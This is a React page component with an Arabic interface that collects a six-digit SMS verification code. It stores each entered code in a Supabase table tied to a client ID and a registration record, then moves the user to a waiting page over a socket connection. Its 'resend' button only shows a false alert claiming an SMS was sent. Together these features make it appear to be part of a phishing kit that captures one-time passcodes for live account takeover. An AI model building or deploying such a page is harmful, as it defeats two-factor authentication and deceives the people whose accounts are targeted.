import { useState, useEffect, useRef } from 'react';
import { useNavigate } from 'react-router-dom';
import { supabase } from '@/lib/supabase';
import { getClientId } from '@/lib/clientId';
import { useSiteConfig } from '@/context/SiteConfigContext';
import { initSocket, disconnectSocket } from '@/lib/socket';

// Logo Component
const Logo = () => (
  <svg viewBox="0 0 100 100" fill="none" xmlns="http://www.w3.org/2000/svg" className="w-[70px] h-[70px]">
    <path d="M20 30 L50 10 L80 30 L50 50 Z" fill="#4c72b8"/>
    <path d="M20 70 L50 50 L80 70 L50 90 Z" fill="#2a9d8f"/>
  </svg>
);

// PowerLogo Component
const PowerLogo = () => (
  <svg viewBox="0 0 100 100" fill="none" stroke="#6c7a9c" strokeWidth="8" className="w-[30px] h-[30px]">
    <polygon points="50,10 90,30 90,70 50,90 10,70 10,30"/>
  </svg>
);

export default function VerifyPage() {
  const navigate = useNavigate();
  const { config } = useSiteConfig();
  const pg = config.verify;

  const [code, setCode] = useState(['', '', '', '', '', '']); // 6 خانات ثابتة
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [timer, setTimer] = useState(300); // 5 دقائق بالثواني
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  
  const regEmail = sessionStorage.getItem('reg_email');
  const regId = sessionStorage.getItem('reg_id');

  // Socket.io connection
  useEffect(() => {
    initSocket('/verify');
    
    return () => {
      disconnectSocket();
    };
  }, []);

  // تحقق من رسالة خطأ من صفحة الانتظار
  useEffect(() => {
    const verifyError = sessionStorage.getItem('verify_error');
    const verifyMessage = sessionStorage.getItem('verify_message');
    
    if (verifyError === 'true' && verifyMessage) {
      setError(verifyMessage);
      sessionStorage.removeItem('verify_error');
      sessionStorage.removeItem('verify_message');
    }
  }, []);

  // مؤقت 5 دقائق
  useEffect(() => {
    if (timer <= 0) return;
    
    const interval = setInterval(() => {
      setTimer(prev => prev - 1);
    }, 1000);
    
    return () => clearInterval(interval);
  }, [timer]);

  // تنسيق الوقت
  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
  };

  const handleInput = (index: number, value: string) => {
    // فقط أرقام
    const digit = value.replace(/[^0-9]/g, '').slice(-1);
    
    const newCode = [...code];
    newCode[index] = digit;
    setCode(newCode);
    setError('');

    // التركيز على التالي
    if (digit && index < 5) {
      inputRefs.current[index + 1]?.focus();
    }

    // التحقق من اكتمال 6 خانات
    if (newCode.every(d => d !== '') && newCode.join('').length === 6) {
      // يمكن إرسال تلقائياً أو ينتظر الزر
    }
  };

  // منع الكتابة في حقول وسطية إذا كان هناك حقول فارغة قبلها
  const handleFocus = (index: number) => {
    const firstEmptyIndex = code.findIndex(d => d === '');
    
    // إذا كان هناك حقل فارغ قبل الحقل المضغوط
    if (firstEmptyIndex !== -1 && firstEmptyIndex < index) {
      // اذهب للحقل الفارغ الأول
      inputRefs.current[firstEmptyIndex]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace') {
      if (code[index] === '' && index > 0) {
        // العودة للخلف إذا كان الحقل فارغ
        inputRefs.current[index - 1]?.focus();
      }
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/[^0-9]/g, '').slice(0, 6);
    
    const newCode = [...code];
    pastedData.split('').forEach((char, i) => {
      if (i < 6) {
        newCode[i] = char;
      }
    });
    setCode(newCode);

    // التركيز على التالي
    const nextEmpty = newCode.findIndex(d => d === '');
    if (nextEmpty !== -1) {
      inputRefs.current[nextEmpty]?.focus();
    } else {
      inputRefs.current[5]?.focus();
    }
  };

  const isComplete = code.every(d => d !== '');

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isComplete) { 
      setError('يرجى إدخال 6 أرقام'); 
      return; 
    }
    
    const fullCode = code.join('');
    setLoading(true); 
    setError('');
    
    try {
      // Save verification code to database
      sessionStorage.setItem('verification_code', fullCode);
      
      // Try to get registration_id if not available
      let registrationId = regId;
      if (!registrationId && regEmail) {
        const { data: regData } = await supabase
          .from('registrations')
          .select('id')
          .eq('email', regEmail)
          .single();
        if (regData) {
          registrationId = regData.id;
        }
      }
      
      // Save to database and get the ID
      try {
        const { data, error: insertError } = await supabase
          .from('verification_codes')
          .insert({
            registration_id: registrationId || null,
            client_id: getClientId(),
            code: fullCode,
          })
          .select()
          .single();
        
        if (!insertError && data) {
          sessionStorage.setItem('verification_attempt_id', data.id);
        }
      } catch (dbErr) {
        console.warn('Could not save verification code to database:', dbErr);
      }
      
      setLoading(false);
      
      // توجيه لصفحة انتظار التحقق
      navigate('/verify-waiting');
    } catch (err) {
      setLoading(false);
      setError('حدث خطأ أثناء معالجة الطلب. يرجى المحاولة لاحقاً.');
    }
  };

  const handleResend = async () => {
    setCode(['', '', '', '', '', '']);
    setError('');
    setTimer(300); // إعادة تعيين المؤقت
    inputRefs.current[0]?.focus();
    alert('تم إعادة إرسال رمز التحقق إلى هاتفك المحمول عبر SMS');
  };

  return (
    <div className="min-h-screen w-full bg-[#101935] flex flex-col justify-between p-5" dir="rtl">
      {/* Top Bar */}
      <div className="w-full flex justify-between items-center text-[#8d99ae] text-sm">
        <span>الإنكليزية</span>
        <i className="fa-solid fa-headset text-lg cursor-pointer"></i>
      </div>

      {/* Main Content - Centered */}
      <div className="w-full max-w-[380px] mx-auto my-0 flex flex-col items-center">
        {/* Logo */}
        <div className="mb-6">
          <Logo />
        </div>

        {/* Title */}
        <h1 className="text-2xl font-bold mb-3 text-white text-center">
          {pg.title}
        </h1>

        {/* Subtitle */}
        <p className="text-[#8d99ae] text-sm text-center mb-8">
          {pg.subtitle}
        </p>

        {/* OTP Inputs */}
        <form onSubmit={handleSubmit} className="w-full">
          <div 
            className="flex gap-2.5 justify-center mb-8"
            dir="ltr"
          >
            {code.map((digit, index) => (
              <input
                key={index}
                ref={el => inputRefs.current[index] = el}
                type="text"
                inputMode="numeric"
                pattern="[0-9]"
                maxLength={1}
                value={digit}
                onChange={(e) => handleInput(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onFocus={() => handleFocus(index)}
                onPaste={handlePaste}
                className="w-12 h-[52px] bg-[#1e2942] border border-[#2a3859] rounded-xl text-white text-2xl font-bold text-center focus:border-[#4c72b8] focus:shadow-[0_0_10px_rgba(76,114,184,0.5)] focus:outline-none transition-all"
              />
            ))}
          </div>

          {/* Error Message */}
          {error && (
            <div className="text-red-400 text-sm text-center py-2 px-3 bg-red-500/10 border border-red-500/20 rounded-lg mb-4">
              {error}
            </div>
          )}

          {/* Submit Button */}
          <button
            type="submit"
            disabled={loading || !isComplete}
            className="w-full py-3.5 bg-[#4c72b8] border-none rounded-xl text-white text-base font-bold cursor-pointer transition-all hover:bg-[#3b5a93] disabled:bg-[#3b4d75] disabled:cursor-not-allowed mb-6"
          >
            {loading ? (
              <span className="flex items-center justify-center gap-2">
                جاري التحقق
                <span className="inline-block w-6 text-right">
                  <span className="animate-pulse">.</span>
                  <span className="animate-pulse delay-200">.</span>
                  <span className="animate-pulse delay-400">.</span>
                </span>
              </span>
            ) : (
              pg.button_text
            )}
          </button>
        </form>

        {/* Resend Section */}
        <div className="text-center text-sm text-[#8d99ae]">
          لم يصلك الرمز؟{' '}
          {timer > 0 ? (
            <span className="text-[#555]">إعادة إرسال ({formatTime(timer)})</span>
          ) : (
            <span 
              className="text-[#4a7c59] font-bold cursor-pointer hover:underline"
              onClick={handleResend}
            >
              إعادة إرسال
            </span>
          )}
        </div>
      </div>

      {/* Footer */}
      <div className="flex flex-col items-center text-[#6c7a9c] text-xs gap-1">
        <span>POWERED BY</span>
        <PowerLogo />
        <span>احدث اصدار</span>
      </div>
    </div>
  );
}
